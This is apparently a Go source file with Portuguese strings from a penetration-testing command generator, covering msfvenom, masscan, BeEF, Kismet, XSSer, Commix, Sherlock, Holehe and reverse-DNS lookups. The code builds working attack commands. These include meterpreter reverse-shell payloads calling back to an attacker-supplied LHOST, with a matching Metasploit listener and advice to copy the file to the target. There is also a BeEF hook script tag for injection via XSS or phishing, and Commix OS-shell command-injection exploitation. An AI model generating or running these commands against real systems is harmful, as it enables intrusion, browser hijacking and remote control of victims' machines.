// ---------------------------------------------------------------------------
// msfvenom
// ---------------------------------------------------------------------------

func generateMsfvenom(t *Tool, a map[string]string) (*Result, error) {
	platform := answer(a, "platform")
	listener := answer(a, "listener")
	lhost := answer(a, "lhost")
	lport := intAnswer(a, "lport", 4444)
	format := answer(a, "format")
	encoder := answer(a, "encoder")

	if !validHost(lhost) {
		return nil, &ValidationError{ID: "lhost", Question: "LHOST (seu IP de atacante)", Reason: "informe um IP ou hostname válido"}
	}
	if lport < 1 || lport > 65535 {
		return nil, &ValidationError{ID: "lport", Question: "LPORT", Reason: "porta deve estar entre 1 e 65535"}
	}

	payload := map[string]string{
		"linux_reverse_tcp":     "linux/x64/meterpreter/reverse_tcp",
		"linux_reverse_https":   "linux/x64/meterpreter/reverse_https",
		"linux_bind_tcp":        "linux/x64/meterpreter/bind_tcp",
		"windows_reverse_tcp":   "windows/x64/meterpreter/reverse_tcp",
		"windows_reverse_https": "windows/x64/meterpreter/reverse_https",
		"windows_bind_tcp":      "windows/x64/meterpreter/bind_tcp",
		"android_reverse_tcp":   "android/meterpreter/reverse_tcp",
		"android_reverse_https": "android/meterpreter/reverse_https",
		"android_bind_tcp":      "android/meterpreter/bind_tcp",
		"macos_reverse_tcp":     "osx/x64/meterpreter/reverse_tcp",
		"macos_reverse_https":   "osx/x64/meterpreter/reverse_https",
		"macos_bind_tcp":        "osx/x64/meterpreter/bind_tcp",
	}[platform+"_"+listener]
	if payload == "" {
		payload = "linux/x64/meterpreter/reverse_tcp"
	}

	defaultFormat, outFile := "elf", "payload.elf"
	switch platform {
	case "windows":
		defaultFormat, outFile = "exe", "payload.exe"
	case "android":
		defaultFormat, outFile = "apk", "payload.apk"
	case "macos":
		defaultFormat, outFile = "macho", "payload.macho"
	}
	if format == "" || format == "auto" {
		format = defaultFormat
	} else {
		switch format {
		case "exe", "exe-service":
			outFile = "payload.exe"
		case "elf":
			outFile = "payload.elf"
		case "apk":
			outFile = "payload.apk"
		case "macho":
			outFile = "payload.macho"
		case "raw":
			outFile = "payload.bin"
		case "ps1":
			outFile = "payload.ps1"
		default:
			outFile = "payload." + format
		}
	}

	args := []string{"-p", payload}
	if listener != "bind_tcp" {
		args = append(args, fmt.Sprintf("LHOST=%s", lhost))
	}
	args = append(args, fmt.Sprintf("LPORT=%d", lport))
	if encoder != "" {
		args = append(args, "-e", q(encoder))
	}
	args = append(args, "-f", format, "-o", q(outFile))

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: []Command{{
			Title:    "Gerar payload",
			Language: "shell",
			Code:     cmd("msfvenom", args...),
			Hint:     "Copie " + outFile + " para o alvo. Inicie o listener no Metasploit antes de executar.",
		}},
		Notes: []string{
			"Listener correspondente: msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD " + payload + "; set LHOST " + lhost + "; set LPORT " + fmt.Sprintf("%d", lport) + "; run'",
			"Bind TCP não usa LHOST; o alvo deve aceitar conexão de entrada.",
			"AVs/EDRs detectam payloads padrão do msfvenom — encoders não garantem evasão.",
		},
		Warnings: []string{"Executar payloads em sistemas sem autorização é crime."},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// masscan
// ---------------------------------------------------------------------------

func generateMasscan(t *Tool, a map[string]string) (*Result, error) {
	targets := answer(a, "targets")
	ports := answer(a, "ports")
	rate := intAnswer(a, "rate", 1000)
	iface := answer(a, "iface")
	outFormats := splitCSV(answer(a, "output"))
	if ports == "" {
		ports = "80,443"
	}
	if iface != "" && !validIface(iface) {
		return nil, &ValidationError{ID: "iface", Question: "Interface", Reason: "valor inválido de interface"}
	}

	args := []string{q(targets), "-p", q(ports)}
	if rate > 0 {
		args = append(args, "--rate", fmt.Sprintf("%d", rate))
	}
	if iface != "" {
		args = append(args, "-e", q(iface))
	}
	for _, f := range outFormats {
		switch f {
		case "normal":
			args = append(args, "-oL", "masscan.out")
		case "xml":
			args = append(args, "-oX", "masscan.xml")
		case "json":
			args = append(args, "-oJ", "masscan.json")
		case "grepable":
			args = append(args, "-oG", "masscan.grep")
		}
	}

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: []Command{{
			Title:    "Varredura massiva de portas",
			Language: "shell",
			Code:     cmd("sudo", append([]string{"masscan"}, args...)...),
			Hint:     "Reduza --rate se o alvo derrubar ou o ISP reclamar; aumente para redes enormes.",
		}},
		Notes: []string{
			"masscan exige root (sudo) para enviar pacotes brutos.",
			"Use --excludefile para evitar IPs críticos (ex.: infraestrutura própria).",
			"É extremamente barulhento: rode em escopo autorizado e horário de baixo tráfego.",
		},
		Warnings: []string{"Escaneamento de redes sem autorização é ilegal e pode derrubar equipamentos."},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// beEF
// ---------------------------------------------------------------------------

func generateBeEF(t *Tool, a map[string]string) (*Result, error) {
	install := answer(a, "install")
	port := intAnswer(a, "port", 3000)
	hookHost := answer(a, "hookHost")
	if !validHost(hookHost) {
		return nil, &ValidationError{ID: "hookHost", Question: "Endereço acessível pelas vítimas", Reason: "informe um IP ou hostname válido"}
	}
	if !validPort(port) {
		return nil, &ValidationError{ID: "port", Question: "Porta HTTP", Reason: "porta deve estar entre 1 e 65535"}
	}

	commands := []Command{}
	if install == "source" {
		commands = append(commands, Command{
			Title:    "Clonar e iniciar o beEF",
			Language: "shell",
			Code:     "git clone https://github.com/beefproject/beef && cd beef && ./beef",
			Hint:     "A primeira execução instala as dependências via bundle.",
		})
	} else {
		commands = append(commands, Command{
			Title:    "Iniciar o beEF (Kali)",
			Language: "shell",
			Code:     "sudo beef-xss",
			Hint:     fmt.Sprintf("Painel em http://localhost:%d/ui/panel (credenciais padrão beef:beef).", port),
		})
	}

	hookURL := fmt.Sprintf("http://%s:%d/hook.js", hookHost, port)
	commands = append(commands, Command{
		Title:    "Testar o hook.js",
		Language: "shell",
		Code:     "curl -s " + hookURL + " | head -n 5",
		Hint:     "Confirma que a vítima alcança o hook. Embute esta URL em um vetor XSS.",
	})

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: commands,
		Notes: []string{
			"Para fisgar uma vítima, injete o hook via XSS ou phishing: <script src=\"" + hookURL + "\"></script>.",
			"Altere as credenciais padrão (beef:beef) no config.yaml antes de expor.",
			"beEF oferece keylogging, screenshots, pivoting e propagação para outros browsers.",
		},
		Warnings: []string{"Fisgar navegadores de terceiros sem consentimento é crime."},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// Kismet
// ---------------------------------------------------------------------------

func generateKismet(t *Tool, a map[string]string) (*Result, error) {
	iface := answer(a, "iface")
	hop := boolAnswer(a, "channelHop")
	logtitle := answer(a, "logtitle")
	if !validIface(iface) {
		return nil, &ValidationError{ID: "iface", Question: "Interface wireless", Reason: "valor inválido de interface"}
	}

	args := []string{"-c", q(iface)}
	if !hop {
		args = append(args, "--no-channel-hopping")
	}
	if logtitle != "" {
		args = append(args, "-t", q(logtitle))
	}

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: []Command{{
			Title:    "Captura passiva com Kismet",
			Language: "shell",
			Code:     cmd("sudo", append([]string{"kismet"}, args...)...),
			Hint:     "A interface web do Kismet roda em http://localhost:2501 por padrão.",
		}},
		Notes: []string{
			"Verifique se a interface suporta modo monitor: sudo airmon-ng start <iface>.",
			"Os logs (.kismet / .netxml) podem ser abertos no Wireshark ou re-importados no Kismet.",
			"Em versões antigas, desabilitar channel hopping usa -n em vez de --no-channel-hopping.",
		},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// XSSer
// ---------------------------------------------------------------------------

func generateXsser(t *Tool, a map[string]string) (*Result, error) {
	url := answer(a, "url")
	auto := boolAnswer(a, "auto")
	cookie := answer(a, "cookie")
	threads := intAnswer(a, "threads", 8)
	verbose := boolAnswer(a, "verbose")

	args := []string{"--url", q(url)}
	if auto {
		args = append(args, "--auto")
	}
	if cookie != "" {
		args = append(args, "-c", q(cookie))
	}
	if threads > 0 {
		args = append(args, "-t", fmt.Sprintf("%d", threads))
	}
	if verbose {
		args = append(args, "-v")
	}

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: []Command{{
			Title:    "Scanner XSS",
			Language: "shell",
			Code:     cmd("xsser", args...),
			Hint:     "Aponte a URL para o parâmetro exato (ex.: http://alvo/?q=).",
		}},
		Notes: []string{
			"XSSer testa vetores refletidos, persistentes e DOM, além de bypass de WAFs.",
			"Combine com um listener (ex.: beEF ou netcat) para explorar os achados.",
		},
		Warnings: []string{"Testes de XSS ativos só em alvos autorizados."},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// Commix
// ---------------------------------------------------------------------------

func generateCommix(t *Tool, a map[string]string) (*Result, error) {
	url := answer(a, "url")
	method := answer(a, "method")
	data := answer(a, "data")
	level := intAnswer(a, "level", 1)
	os := answer(a, "os")
	batch := boolAnswer(a, "batch")
	shell := boolAnswer(a, "shell")
	randomAgent := boolAnswer(a, "randomAgent")

	if method == "post" && data == "" {
		return nil, &ValidationError{ID: "data", Question: "Corpo POST / parâmetros", Reason: "necessário quando o método é POST"}
	}

	args := []string{"--url", q(url)}
	if method == "post" {
		args = append(args, "--data="+q(data))
	}
	if level > 0 {
		args = append(args, "--level", fmt.Sprintf("%d", level))
	}
	if os != "" && os != "auto" {
		args = append(args, "--os", os)
	}
	if batch {
		args = append(args, "--batch")
	}
	if shell {
		args = append(args, "--os-shell")
	}
	if randomAgent {
		args = append(args, "--random-agent")
	}

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: []Command{{
			Title:    "Exploração de injeção de comandos",
			Language: "shell",
			Code:     cmd("commix", args...),
			Hint:     "Comece com --level 1 e aumente se necessário. --os-shell tenta uma shell interativa.",
		}},
		Notes: []string{
			"Commix detecta e explora injeções em parâmetros, headers e cookies.",
			"Combine com --random-agent para reduzir fingerprinting.",
		},
		Warnings: []string{"Execução remota de comandos é altamente invasiva: exige autorização formal."},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// Sherlock
// ---------------------------------------------------------------------------

func generateSherlock(t *Tool, a map[string]string) (*Result, error) {
	usernames := splitCSV(answer(a, "usernames"))
	timeout := intAnswer(a, "timeout", 5)
	printFound := boolAnswer(a, "printFound")
	noColor := boolAnswer(a, "noColor")
	output := answer(a, "output")
	if len(usernames) == 0 {
		return nil, &ValidationError{ID: "usernames", Question: "Nome(s) de usuário", Reason: "informe ao menos um nome de usuário"}
	}

	args := []string{}
	if timeout > 0 {
		args = append(args, "--timeout", fmt.Sprintf("%d", timeout))
	}
	if printFound {
		args = append(args, "--print-found")
	}
	if noColor {
		args = append(args, "--no-color")
	}
	if output != "" {
		args = append(args, "-o", q(output))
	}
	for _, u := range usernames {
		args = append(args, q(u))
	}

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: []Command{{
			Title:    "Buscar perfis do usuário",
			Language: "shell",
			Code:     cmd("sherlock", args...),
			Hint:     "Rode com timeout baixo para evitar bloqueio por rate-limit nos sites.",
		}},
		Notes: []string{
			"Sherlock consulta 300+ sites; resultados positivos indicam contas existentes.",
			"Use --tor (requer Tor ativo) ou --proxy <url> para anonimizar.",
		},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// Holehe
// ---------------------------------------------------------------------------

func generateHolehe(t *Tool, a map[string]string) (*Result, error) {
	email := answer(a, "email")
	onlyUsed := boolAnswer(a, "onlyUsed")
	noColor := boolAnswer(a, "noColor")
	csv := answer(a, "csv")

	if !strings.Contains(email, "@") || strings.ContainsAny(email, " \t\n\"'`$;&|()<>\\") {
		return nil, &ValidationError{ID: "email", Question: "Endereço de e-mail", Reason: "informe um e-mail válido"}
	}

	args := []string{q(email)}
	if onlyUsed {
		args = append(args, "--only-used")
	}
	if noColor {
		args = append(args, "--no-color")
	}
	if csv != "" {
		args = append(args, "-C", q(csv))
	}

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: []Command{{
			Title:    "Verificar registros do e-mail",
			Language: "shell",
			Code:     cmd("holehe", args...),
			Hint:     "Sites onde o e-mail NÃO está registrado aparecem como 'not used'.",
		}},
		Notes: []string{
			"Consulta apenas fontes públicas — os resultados indicam presença em serviços, não credenciais.",
			"O uso para OSINT de terceiros deve respeitar a legislação local de proteção de dados.",
		},
	}
	return res, nil
}

// ---------------------------------------------------------------------------
// Reverse Genie (rDNS)
// ---------------------------------------------------------------------------

func generateRDNS(t *Tool, a map[string]string) (*Result, error) {
	target := answer(a, "target")
	method := answer(a, "method")
	resolver := answer(a, "resolver")
	output := answer(a, "output")
	if target == "" {
		return nil, &ValidationError{ID: "target", Question: "Alvo (IP, range ou rede)", Reason: "campo obrigatório não preenchido"}
	}
	if resolver != "" && !validHost(resolver) {
		return nil, &ValidationError{ID: "resolver", Question: "Nameserver", Reason: "informe um IP ou hostname válido"}
	}

	var code, hint string
	switch method {
	case "dnsrecon":
		args := []string{"-r", q(target)}
		if resolver != "" {
			args = append(args, "-n", q(resolver))
		}
		if output != "" {
			args = append(args, "-c", q(output))
		}
		code = cmd("dnsrecon", args...)
		hint = "Varredura reversa de todo o range/CIDR informado."
	case "nmap":
		args := []string{"-sL", q(target)}
		if output != "" {
			args = append(args, "-oN", q(output))
		}
		code = cmd("nmap", args...)
		hint = "-sL apenas resolve nomes, sem varrer portas (não precisa de root)."
	default: // dig
		args := []string{"-x", q(target)}
		if resolver != "" {
			args = append(args, "@"+resolver)
		}
		code = cmd("dig", args...)
		hint = "Para um único IP, dig -x faz o PTR lookup."
	}

	res := &Result{
		ToolID:   t.ID,
		ToolName: t.Name,
		Risk:     t.Risk,
		Commands: []Command{{
			Title:    "Reverse DNS lookup",
			Language: "shell",
			Code:     code,
			Hint:     hint,
		}},
		Notes: []string{
			"rDNS ajuda a identificar hosts e serviços pelo nome (ex.: dc01.corp.local).",
			"Combine com zone transfer (dig axfr @ns dominio) para mapeamento completo.",
		},
	}
	return res, nil
}
